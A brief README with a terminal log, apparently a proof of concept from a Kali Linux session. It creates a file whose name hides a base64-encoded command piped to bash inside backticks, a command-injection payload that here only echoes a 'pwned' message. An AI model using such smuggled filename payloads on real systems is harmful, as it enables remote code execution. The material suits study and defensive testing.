# createfiles

└─$ gcc createfile.c -o createfile
                                                                                                                                                             
┌──(kali㉿kali)-[/tmp/rce]
└─$ ./createfile
[*] Target filename: poc.txt`{echo,ZWNobyAieW91IGhhdmUgcHduZWQgWytdISAi}|{base64,-d}|bash`
[*] Calling syscall(SYS_openat)...
[+] File created successfully! fd=3
[+] Wrote 9 bytes to file.
[+] File closed successfully.
[*] Done.


